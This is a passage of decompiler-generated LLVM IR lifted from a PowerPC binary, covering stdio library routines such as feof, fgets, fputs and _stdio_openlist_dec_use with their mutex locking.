  %v0_1000ac40 = phi i32 [ %v0_1000ac40.pre, %dec_label_pc_1000ac0c.dec_label_pc_1000ac34_crit_edge ], [ %v1_1000abe4, %dec_label_pc_1000ac04 ], [ %v1_1000abe4, %dec_label_pc_1000abfc ]
  %v0_1000ac38 = phi i32 [ %v0_1000ac38.pre, %dec_label_pc_1000ac0c.dec_label_pc_1000ac34_crit_edge ], [ %v0_1000abdc, %dec_label_pc_1000ac04 ], [ %v0_1000abdc, %dec_label_pc_1000abfc ]
  store i32 %v2_1000a874.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000ac38 = mul i32 %v0_1000ac38, 4
  store i32 %v1_1000ac38, i32* %r0.global-to-local, align 4
  %v2_1000ac3c = add i32 %v1_1000ac38, %v2_1000a874.pre-phi
  %v3_1000ac3c = inttoptr i32 %v2_1000ac3c to i32*
  %v4_1000ac3c = load i32, i32* %v3_1000ac3c, align 4
  store i32 %v4_1000ac3c, i32* %r0.global-to-local, align 4
  %v1_1000ac40 = mul i32 %v0_1000ac40, 4
  %v2_1000ac44 = add i32 %v1_1000ac40, %v1_1000ac44
  store i32 %v2_1000ac44, i32* %r9.global-to-local, align 4
  %v2_1000ac48 = add i32 %v2_1000ac44, 40
  %v3_1000ac48 = inttoptr i32 %v2_1000ac48 to i32*
  store i32 %v4_1000ac3c, i32* %v3_1000ac48, align 4
  br label %dec_label_pc_1000ac4c

dec_label_pc_1000ac4c:                            ; preds = %dec_label_pc_1000ac0c, %dec_label_pc_1000abd8, %dec_label_pc_1000ac34
  %v0_1000ac4c = load i32, i32* @r28, align 4
  %v1_1000ac4c = add i32 %v0_1000ac4c, 28
  %v2_1000ac4c = inttoptr i32 %v1_1000ac4c to i32*
  %v3_1000ac4c = load i32, i32* %v2_1000ac4c, align 4
  %v0_1000ac50 = load i32, i32* @r27, align 4
  %v1_1000ac50 = add i32 %v0_1000ac50, 1
  store i32 %v1_1000ac50, i32* @r27, align 4
  %v1_1000ac54 = add i32 %v3_1000ac4c, 2
  store i32 %v1_1000ac54, i32* %r9.global-to-local, align 4
  %v2_1000ac58 = icmp slt i32 %v1_1000ac50, %v1_1000ac54
  br i1 %v2_1000ac58, label %dec_label_pc_1000ab94, label %dec_label_pc_1000ac7c

dec_label_pc_1000ac64:                            ; preds = %dec_label_pc_1000ab88
  %v0_1000ac64 = load i32, i32* @r28, align 4
  %v1_1000ac64 = add i32 %v0_1000ac64, 28
  %v2_1000ac64 = inttoptr i32 %v1_1000ac64 to i32*
  %v3_1000ac64 = load i32, i32* %v2_1000ac64, align 4
  store i32 %v3_1000ac64, i32* %r5.global-to-local, align 4
  %v1_1000ac68 = add i32 %v0_1000ac64, 40
  store i32 %v1_1000ac68, i32* @r3, align 4
  %v0_1000ac6c = load i32, i32* @r7, align 4
  %v1_1000ac6c = trunc i32 %v0_1000ac6c to i8
  %v3_1000ac6c = add i32 %v0_1000ac64, 38
  %v4_1000ac6c = inttoptr i32 %v3_1000ac6c to i8*
  store i8 %v1_1000ac6c, i8* %v4_1000ac6c, align 1
  %v2_1000ac70 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000ac70, i32* @r4, align 4
  %v0_1000ac74 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ac74 = mul i32 %v0_1000ac74, 4
  store i32 %v1_1000ac74, i32* @r5, align 4
  store i32 268479612, i32* @lr, align 4
  %v0_1000ac78 = call i32 @memcpy()
  store i32 %v0_1000ac78, i32* %r3.global-to-local, align 4
  %v0_1000ac7c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000ac7c

dec_label_pc_1000ac7c:                            ; preds = %dec_label_pc_1000ac4c, %dec_label_pc_1000ac64
  %v0_1000ac7c = phi i32 [ %v0_1000ac7c.pre, %dec_label_pc_1000ac64 ], [ %v0_1000ac4c, %dec_label_pc_1000ac4c ]
  %v1_1000ac7c = add i32 %v0_1000ac7c, 16
  %v2_1000ac7c = inttoptr i32 %v1_1000ac7c to i32*
  %v3_1000ac7c = load i32, i32* %v2_1000ac7c, align 4
  store i32 %v3_1000ac7c, i32* %r0.global-to-local, align 4
  %v0_1000ac80 = load i32, i32* @r26, align 4
  %v2_1000ac80 = add i32 %v0_1000ac7c, 24
  %v3_1000ac80 = inttoptr i32 %v2_1000ac80 to i32*
  store i32 %v0_1000ac80, i32* %v3_1000ac80, align 4
  %v0_1000ac84 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ac84 = and i32 %v0_1000ac84, 128
  store i32 %v1_1000ac84, i32* %r9.global-to-local, align 4
  %v3_1000ac84 = icmp eq i32 %v1_1000ac84, 0
  br i1 %v3_1000ac84, label %dec_label_pc_1000ac8c, label %dec_label_pc_1000ac98

dec_label_pc_1000ac8c:                            ; preds = %dec_label_pc_1000ac7c
  %v0_1000ac8c = load i32, i32* @r30, align 4
  %v1_1000ac8c = add i32 %v0_1000ac8c, 1
  store i32 %v1_1000ac8c, i32* %r0.global-to-local, align 4
  %v1_1000ac90 = load i32, i32* @r28, align 4
  %v2_1000ac90 = inttoptr i32 %v1_1000ac90 to i32*
  store i32 %v1_1000ac8c, i32* %v2_1000ac90, align 4
  br label %dec_label_pc_1000acb0

dec_label_pc_1000ac98:                            ; preds = %dec_label_pc_1000ac7c
  %v2_1000ac98 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000ac98, i32* %r0.global-to-local, align 4
  %v0_1000ac9c = load i32, i32* @r28, align 4
  %v1_1000ac9c = inttoptr i32 %v0_1000ac9c to i32*
  %v2_1000ac9c = load i32, i32* %v1_1000ac9c, align 4
  %v1_1000aca0 = load i32, i32* @r30, align 4
  %v2_1000aca0 = sub i32 %v1_1000aca0, %v2_1000ac98
  %v1_1000aca4 = mul i32 %v2_1000aca0, 4
  store i32 %v1_1000aca4, i32* %r0.global-to-local, align 4
  %v2_1000aca8 = add i32 %v1_1000aca4, %v2_1000ac9c
  store i32 %v2_1000aca8, i32* %r9.global-to-local, align 4
  store i32 %v2_1000aca8, i32* %v1_1000ac9c, align 4
  br label %dec_label_pc_1000acb0

dec_label_pc_1000acb0:                            ; preds = %dec_label_pc_1000ac8c, %dec_label_pc_1000ac98
  %v0_1000acb0 = load i32, i32* @r28, align 4
  %v1_1000acb0 = add i32 %v0_1000acb0, 28
  %v2_1000acb0 = inttoptr i32 %v1_1000acb0 to i32*
  %v3_1000acb0 = load i32, i32* %v2_1000acb0, align 4
  store i32 %v3_1000acb0, i32* %r9.global-to-local, align 4
  %v1_1000acb4 = add i32 %v3_1000acb0, 2
  br label %dec_label_pc_1000acc0

dec_label_pc_1000acc0:                            ; preds = %dec_label_pc_1000a824, %dec_label_pc_1000a8f8, %dec_label_pc_1000a9d4, %dec_label_pc_1000a9c8, %dec_label_pc_1000a9f0, %dec_label_pc_1000a92c, %dec_label_pc_1000abcc, %dec_label_pc_1000aa7c, %dec_label_pc_1000ab70, %dec_label_pc_1000acb0
  %storemerge2 = phi i32 [ %v1_1000acb4, %dec_label_pc_1000acb0 ], [ -1, %dec_label_pc_1000ab70 ], [ -1, %dec_label_pc_1000aa7c ], [ -1, %dec_label_pc_1000abcc ], [ -1, %dec_label_pc_1000a92c ], [ -1, %dec_label_pc_1000a9f0 ], [ -1, %dec_label_pc_1000a9c8 ], [ -1, %dec_label_pc_1000a9d4 ], [ -1, %dec_label_pc_1000a8f8 ], [ -1, %dec_label_pc_1000a824 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000a7bc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000aca4, { 1, 0 }
  uselistorder i32 %v0_1000ac7c, { 1, 0 }
  uselistorder i32 %v1_1000ac50, { 1, 2, 0 }
  uselistorder i32 %v1_1000ac38, { 1, 0 }
  uselistorder i32 %v0_1000ac24, { 0, 2, 1 }
  uselistorder i32 %v3_1000abf4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000abf0, { 1, 2, 0 }
  uselistorder i32 %v1_1000abe4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000abdc, { 1, 0 }
  uselistorder i32 %v0_1000abdc, { 1, 2, 0 }
  uselistorder i32 %v3_1000aba4, { 1, 0, 2 }
  uselistorder i32 %v1_1000ab9c, { 1, 0 }
  uselistorder i32 %v0_1000abbc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000ab14, { 1, 2, 0 }
  uselistorder i32 %v1_1000aaec, { 2, 1, 0 }
  uselistorder i32 %v1_1000aad8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000aabc, { 1, 0, 2 }
  uselistorder i32 %v1_1000aa88, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000aa44, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000aa08, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000a9f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000a964, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000a960, { 1, 0 }
  uselistorder i32 %v0_1000a978, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000a8dc, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000a8d4, { 1, 0 }
  uselistorder i32 %v1_1000a8c4, { 1, 0 }
  uselistorder i32 %v3_1000a8bc, { 1, 0, 2 }
  uselistorder i32 %v0_1000a938, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000a908, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000a898, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000a880, { 1, 0 }
  uselistorder i32 %v2_1000a874.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000a854, { 1, 0 }
  uselistorder i32 %v1_1000a83c, { 1, 2, 0 }
  uselistorder i32 %v0_1000a830, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 7, 8, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 6, 2, 0, 7, 8, 9, 3, 4, 5, 1 }
  uselistorder i32* %r11.global-to-local, { 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r0.global-to-local, { 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10016064.301 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10016024.300 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000acc0, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000acb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000abd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000abc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab88, { 1, 0 }
  uselistorder label %dec_label_pc_1000aad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa00, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a9b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a924, { 1, 0 }
  uselistorder label %dec_label_pc_1000a91c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a8bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a884, { 1, 0 }
  uselistorder label %dec_label_pc_1000a880, { 1, 0 }
  uselistorder label %dec_label_pc_1000a864, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000acdc = call i32 @__asm_mfcr()
  %v2_1000ace8 = add i32 %v0_1000acdc, 56
  store i32 %v2_1000ace8, i32* %r30.global-to-local, align 4
  %v2_1000ad00 = add i32 %v0_1000acdc, 52
  %v3_1000ad00 = inttoptr i32 %v2_1000ad00 to i32*
  %v4_1000ad00 = load i32, i32* %v3_1000ad00, align 4
  %v3_1000ad08 = icmp eq i32 %v4_1000ad00, 0
  store i1 %v3_1000ad08, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000ad08, label %dec_label_pc_1000ad1c, label %dec_label_pc_1000ad1c.thread

dec_label_pc_1000ad1c.thread:                     ; preds = %entry
  %v1_1000ad243 = inttoptr i32 %v0_1000acdc to i16*
  %v2_1000ad244 = load i16, i16* %v1_1000ad243, align 2
  %v3_1000ad245 = zext i16 %v2_1000ad244 to i32
  br label %dec_label_pc_1000ad30

dec_label_pc_1000ad1c:                            ; preds = %entry
  %v2_1000ad04 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000ad10 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 %v2_1000ace8)
  %v0_1000ad14 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ad1c.306 to i32), i32* @lr, align 4
  %v1_1000ad18 = call i32 @pthread_mutex_lock(i32 %v0_1000ad14)
  %v0_1000ad24.pre = load i32, i32* @r31, align 4
  %v0_1000ad28.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1000ad04, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000ad24 = inttoptr i32 %v0_1000ad24.pre to i16*
  %v2_1000ad24 = load i16, i16* %v1_1000ad24, align 2
  %v3_1000ad24 = zext i16 %v2_1000ad24 to i32
  br i1 %v0_1000ad28.pre, label %dec_label_pc_1000ad2c, label %dec_label_pc_1000ad30

dec_label_pc_1000ad2c:                            ; preds = %dec_label_pc_1000ad1c
  store i32 268479792, i32* @lr, align 4
  %v0_1000ad2c = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000ad30

dec_label_pc_1000ad30:                            ; preds = %dec_label_pc_1000ad1c.thread, %dec_label_pc_1000ad1c, %dec_label_pc_1000ad2c
  %v3_1000ad246 = phi i32 [ %v3_1000ad245, %dec_label_pc_1000ad1c.thread ], [ %v3_1000ad24, %dec_label_pc_1000ad1c ], [ %v3_1000ad24, %dec_label_pc_1000ad2c ]
  %v1_1000ad34 = call i32 @__asm_rlwinm(i32 %v3_1000ad246, i32 0, i32 29, i32 29)
  %v1_1000ad44 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000acdc)
  ret i32 %v1_1000ad34

; uselistorder directives
  uselistorder i32 %v0_1000acdc, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000ad30, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ad58 = call i32 @__asm_mfcr()
  %v1_1000ad60 = add i32 %arg3, 56
  store i32 %v1_1000ad60, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_1000ad58, i32* %r28.global-to-local, align 4
  %v1_1000ad7c = add i32 %arg3, 52
  %v2_1000ad7c = inttoptr i32 %v1_1000ad7c to i32*
  %v3_1000ad7c = load i32, i32* %v2_1000ad7c, align 4
  %v2_1000ad80 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000ad8c = icmp eq i32 %v3_1000ad7c, 0
  store i1 %v3_1000ad8c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000ad8c, label %dec_label_pc_1000ad94, label %dec_label_pc_1000ada0

dec_label_pc_1000ad94:                            ; preds = %entry
  %v4_1000ad94 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 %v1_1000ad60)
  %v0_1000ad98 = load i32, i32* %r29.global-to-local, align 4
  store i32 268479904, i32* @lr, align 4
  %v1_1000ad9c = call i32 @pthread_mutex_lock(i32 %v0_1000ad98)
  %v0_1000ada0.pre = load i32, i32* @r30, align 4
  %v0_1000ada4.pre = load i32, i32* @r31, align 4
  %v0_1000ada8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000ada0

dec_label_pc_1000ada0:                            ; preds = %entry, %dec_label_pc_1000ad94
  %v0_1000ada8 = phi i32 [ %v0_1000ad58, %entry ], [ %v0_1000ada8.pre, %dec_label_pc_1000ad94 ]
  %v0_1000ada4 = phi i32 [ %arg3, %entry ], [ %v0_1000ada4.pre, %dec_label_pc_1000ad94 ]
  %v0_1000ada0 = phi i32 [ %arg2, %entry ], [ %v0_1000ada0.pre, %dec_label_pc_1000ad94 ]
  store i32 268479920, i32* @lr, align 4
  %v3_1000adac = inttoptr i32 %v0_1000ada8 to i8*
  %v4_1000adac = call i32 @__GI_fgets_unlocked(i8* %v3_1000adac, i32 %v0_1000ada0, i32 %v0_1000ada4)
  store i32 1, i32* @r4, align 4
  store i32 %v2_1000ad80, i32* @r3, align 4
  %v0_1000adbc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000adbc, label %dec_label_pc_1000adc0, label %dec_label_pc_1000adc4

dec_label_pc_1000adc0:                            ; preds = %dec_label_pc_1000ada0
  store i32 268479940, i32* @lr, align 4
  %v0_1000adc0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000adc8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000adc4

dec_label_pc_1000adc4:                            ; preds = %dec_label_pc_1000ada0, %dec_label_pc_1000adc0
  %v0_1000adc8 = phi i32 [ %v4_1000adac, %dec_label_pc_1000ada0 ], [ %v0_1000adc8.pre, %dec_label_pc_1000adc0 ]
  %v1_1000add8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000ad58)
  %v9_1000add8 = extractvalue %0 %v1_1000add8, 7
  store i4 %v9_1000add8, i4* @cr4, align 1
  ret i32 %v0_1000adc8

; uselistorder directives
  uselistorder i32 %v0_1000ad58, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000adc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ada0, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000adec = call i32 @__asm_mfcr()
  %v1_1000adf4 = add i32 %arg2, 56
  store i32 %v1_1000adf4, i32* %r30.global-to-local, align 4
  store i32 %v0_1000adec, i32* @r29, align 4
  %v2_1000ae0c = ptrtoint i32* %stack_var_-40 to i32
  %v1_1000ae10 = add i32 %arg2, 52
  %v2_1000ae10 = inttoptr i32 %v1_1000ae10 to i32*
  %v3_1000ae10 = load i32, i32* %v2_1000ae10, align 4
  %v3_1000ae1c = icmp eq i32 %v3_1000ae10, 0
  store i1 %v3_1000ae1c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000ae1c, label %dec_label_pc_1000ae24, label %dec_label_pc_1000ae30

dec_label_pc_1000ae24:                            ; preds = %entry
  %v4_1000ae24 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 %v1_1000adf4)
  %v0_1000ae28 = load i32, i32* %r30.global-to-local, align 4
  store i32 268480048, i32* @lr, align 4
  %v1_1000ae2c = call i32 @pthread_mutex_lock(i32 %v0_1000ae28)
  %v0_1000ae30.pre = load i32, i32* @r31, align 4
  %v0_1000ae34.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ae30

dec_label_pc_1000ae30:                            ; preds = %entry, %dec_label_pc_1000ae24
  %v0_1000ae34 = phi i32 [ %v0_1000adec, %entry ], [ %v0_1000ae34.pre, %dec_label_pc_1000ae24 ]
  %v0_1000ae30 = phi i32 [ %arg2, %entry ], [ %v0_1000ae30.pre, %dec_label_pc_1000ae24 ]
  store i32 268480060, i32* @lr, align 4
  %v2_1000ae38 = call i32 @__GI_fputs_unlocked(i32 %v0_1000ae34, i32 %v0_1000ae30)
  store i32 1, i32* @r4, align 4
  store i32 %v2_1000ae38, i32* @r31, align 4
  store i32 %v2_1000ae0c, i32* @r3, align 4
  %v0_1000ae48 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000ae48, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000ae50

dec_label_pc_1000ae4c:                            ; preds = %dec_label_pc_1000ae30
  store i32 268480080, i32* @lr, align 4
  %v0_1000ae4c = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000ae54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ae50

dec_label_pc_1000ae50:                            ; preds = %dec_label_pc_1000ae30, %dec_label_pc_1000ae4c
  %v0_1000ae54 = phi i32 [ %v2_1000ae38, %dec_label_pc_1000ae30 ], [ %v0_1000ae54.pre, %dec_label_pc_1000ae4c ]
  %v1_1000ae64 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000adec)
  ret i32 %v0_1000ae54

; uselistorder directives
  uselistorder i32 %v0_1000adec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ae50, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae30, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002bf18.278 to i32), i32* @r29, align 4
  %v2_1000ae94 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1000ae9c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268461856, i32 ptrtoint (i32* @global_var_1002bf18.278 to i32))
  %v0_1000aea0 = load i32, i32* @r29, align 4
  store i32 268480168, i32* @lr, align 4
  %v1_1000aea4 = call i32 @pthread_mutex_lock(i32 %v0_1000aea0)
  %v3_1000aeac = load i32, i32* @global_var_1002c380.279, align 4
  %v3_1000aeb0 = icmp eq i32 %v3_1000aeac, 1
  br i1 %v3_1000aeb0, label %dec_label_pc_1000aeb8, label %dec_label_pc_1000af60

dec_label_pc_1000aeb8:                            ; preds = %entry
  %v3_1000aebc = load i16*, i16** @global_var_1002c384.280, align 4
  %v2_1000aec0 = icmp sgt i16* %v3_1000aebc, null
  br i1 %v2_1000aec0, label %dec_label_pc_1000aec8, label %dec_label_pc_1000af60

dec_label_pc_1000aec8:                            ; preds = %dec_label_pc_1000aeb8
  %v0_1000aecc = load i32, i32* @r31, align 4
  %v2_1000aed4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* @r30, align 4
  %v4_1000aee0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000aecc, i32 ptrtoint (i32* @global_var_1002bf00.283 to i32))
  store i32 268480236, i32* @lr, align 4
  %v1_1000aee8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002bf00.283 to i32))
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_1000af4010 = icmp eq i32 %storemerge7, 0
  %v0_1000af4411 = load i32, i32* @r30, align 4
  br i1 %v3_1000af4010, label %dec_label_pc_1000af4c, label %dec_label_pc_1000aef8

dec_label_pc_1000aef8:                            ; preds = %dec_label_pc_1000aec8, %dec_label_pc_1000af40.backedge
  %v0_1000af4416 = phi i32 [ %v0_1000af44, %dec_label_pc_1000af40.backedge ], [ %v0_1000af4411, %dec_label_pc_1000aec8 ]
  %v3_1000af4417.in = phi i32 [ %v0_1000af44, %dec_label_pc_1000af40.backedge ], [ %v0_1000af4411, %dec_label_pc_1000aec8 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_1000af40.backedge ], [ %storemerge7, %dec_label_pc_1000aec8 ]
  %v1_1000aef8 = inttoptr i32 %storemerge15 to i16*
  %v2_1000aef8 = load i16, i16* %v1_1000aef8, align 2
  %v1_1000aefc = add i32 %storemerge15, 32
  %v2_1000aefc = inttoptr i32 %v1_1000aefc to i32*
  %v3_1000aefc = load i32, i32* %v2_1000aefc, align 4
  store i32 %v3_1000aefc, i32* @r31, align 4
  %v1_1000af00 = and i16 %v2_1000aef8, -32720
  %v3_1000af04 = icmp eq i16 %v1_1000af00, 48
  br i1 %v3_1000af04, label %dec_label_pc_1000af14, label %dec_label_pc_1000af0c

dec_label_pc_1000af0c:                            ; preds = %dec_label_pc_1000aef8
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_1000af40.backedge

dec_label_pc_1000af14:                            ; preds = %dec_label_pc_1000aef8
  %v3_1000af4417 = icmp eq i32 %v3_1000af4417.in, 0
  br i1 %v3_1000af4417, label %dec_label_pc_1000af18, label %dec_label_pc_1000af24

dec_label_pc_1000af18:                            ; preds = %dec_label_pc_1000af14
  store i32 %v3_1000aefc, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  br label %dec_label_pc_1000af28

dec_label_pc_1000af24:                            ; preds = %dec_label_pc_1000af14
  %v2_1000af24 = add i32 %v0_1000af4416, 32
  %v3_1000af24 = inttoptr i32 %v2_1000af24 to i32*
  store i32 %v3_1000aefc, i32* %v3_1000af24, align 4
  %v0_1000af28.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000af28

dec_label_pc_1000af28:                            ; preds = %dec_label_pc_1000af18, %dec_label_pc_1000af24
  %v0_1000af28 = phi i32 [ %storemerge15, %dec_label_pc_1000af18 ], [ %v0_1000af28.pre, %dec_label_pc_1000af24 ]
  %v1_1000af28 = inttoptr i32 %v0_1000af28 to i16*
  %v2_1000af28 = load i16, i16* %v1_1000af28, align 2
  store i32 %v0_1000af28, i32* @r3, align 4
  %v1_1000af30 = and i16 %v2_1000af28, 8192
  %v3_1000af30 = icmp eq i16 %v1_1000af30, 0
  br i1 %v3_1000af30, label %dec_label_pc_1000af40.backedge, label %dec_label_pc_1000af38

dec_label_pc_1000af40.backedge:                   ; preds = %dec_label_pc_1000af28, %dec_label_pc_1000af0c, %dec_label_pc_1000af38
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000af40 = icmp eq i32 %storemerge, 0
  %v0_1000af44 = load i32, i32* @r30, align 4
  br i1 %v3_1000af40, label %dec_label_pc_1000af4c, label %dec_label_pc_1000aef8

dec_label_pc_1000af38:                            ; preds = %dec_label_pc_1000af28
  store i32 268480316, i32* @lr, align 4
  %v0_1000af38 = call i32 @free()
  br label %dec_label_pc_1000af40.backedge

dec_label_pc_1000af4c:                            ; preds = %dec_label_pc_1000af40.backedge, %dec_label_pc_1000aec8
  store i32 %v2_1000aed4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268480344, i32* @lr, align 4
  %v0_1000af54 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000af5c = load i32, i32* @r29, align 4
  %v4_1000af5c = inttoptr i32 %v0_1000af5c to i16*
  store i16* %v4_1000af5c, i16** @global_var_1002c384.280, align 4
  %v3_1000af68.pre = load i32, i32* @global_var_1002c380.279, align 4
  br label %dec_label_pc_1000af60

dec_label_pc_1000af60:                            ; preds = %dec_label_pc_1000aeb8, %entry, %dec_label_pc_1000af4c
  %v3_1000af68 = phi i32 [ 1, %dec_label_pc_1000aeb8 ], [ %v3_1000aeac, %entry ], [ %v3_1000af68.pre, %dec_label_pc_1000af4c ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r11, align 4
  store i32 %v2_1000ae94, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000af70 = add i32 %v3_1000af68, -1
  store i32 %v1_1000af70, i32* @global_var_1002c380.279, align 4
  store i32 268480380, i32* @lr, align 4
  %v0_1000af78 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1000af78

; uselistorder directives
  uselistorder i32 %v0_1000af44, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000af28, { 1, 0 }
  uselistorder i32 %v3_1000aefc, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
